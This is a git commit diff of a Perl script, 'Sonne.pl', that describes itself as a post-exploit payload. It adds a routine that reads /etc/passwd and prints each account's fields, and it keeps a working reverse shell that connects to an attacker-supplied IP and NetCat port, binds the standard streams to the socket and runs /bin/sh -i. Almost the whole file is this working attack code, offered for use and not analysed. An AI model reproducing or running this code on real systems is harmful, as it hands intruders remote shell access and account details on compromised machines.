d74d495aaa647f82321957291e70a65a72c71e07
C4RnaG3 <35183248+C4RnaG3@users.noreply.github.com>
2019-03-08 08:08:55 +0000

    Update Sonne.pl

--- Sonne.pl
+++ Sonne.pl
@@ -1,46 +1,69 @@
 #!/usr/bin/perl
 
-#rough code, still need to make a lot o' shit
+#-- Post exploit payload
+#-- Yes, this program name is a Rammstein reference
 
 use strict;
 use warnings;
 use Term::ANSIColor;
 use Socket;
 
+#---------------------------------#
 system ('clear');
-
+#---------------------------------#
 main();
-
+#---------------------------------#
 sub main {
 	print color('bright_cyan');
+	
 }
 
+
+
+#---------------------------------#
+#-- User Info grabbing -- Working on output formatting
 sub passwd {
-	open(PASSWD, "/etc/passwd");
-	print color('bright_magenta');
+    open(PASSWD, "</etc/passwd");
 
-	while (<PASSWD>) {
+    print color('bright_magenta');
+    print "+-------------------------------------------------------------+\n";
+    print "+ UID | GUID | UserName | Password | Real Name | Home | Shell +\n";
+    print "+-------------------------------------------------------------+\n";
+    while (<PASSWD>) {
 		chomp($_);
-		my ($user, $pass, $uid, $gid, $real, $home, $shell) = split /:/, $_;
-	}
-	print color('reset');
-	close PASSWD;
+        my ($user, $pass, $uid, $gid, $real, $home, $shell) = split /:/, $_;
+        print "+ $uid | $gid | $user | $pass | $real | $home | $shell \n";
+    }
+    print color('reset');
+    close PASSWD;
 }
-
+#---------------------------------#
+#-- Reverse shell
 sub shell {
-	print "What is your IP address: ";
-	chomp(my $ip = <STDIN>);
-	print "What is the open port ";
-	chomp(my $port = <STDIN>);
+    #-- Attacker information
+	print color('bright_cyan');
+	print "+--------------------------------------+\n";
+	print "+ No harm in having another shell\n";
+	print "+ What is your IP address: ";
+	print color('bright_red');
+	chomp(our $ip = <STDIN>);
+	print color('bright_cyan');
+	print "+ What port did you open in NetCat: ";
+	print color('bright_red');
+	chomp(our $port = <STDIN>);
+	print "+--------------------------------------+\n";
+	print color('reset');
 
-	socket(S,PF_INET,SOCK_STREAM,getprotobyname("TCP"));
-	if (connect(S,sockaddr_in($port,inet_aton($ip)))) {
+
+	socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+	if (connect(S,sockaddr_in($port,inet_aton($ip)))){
 		open(STDIN, ">&S");
 		open(STDOUT, ">&S");
 		open(STDERR, ">&S");
 		exec("/bin/sh -i");
 	}
 	else {
-		print color('bright_red'), "Unable to open a shell\n";
+		print color('bright_red'), "Unable to open a shell!!\n";
 	}
+
 }
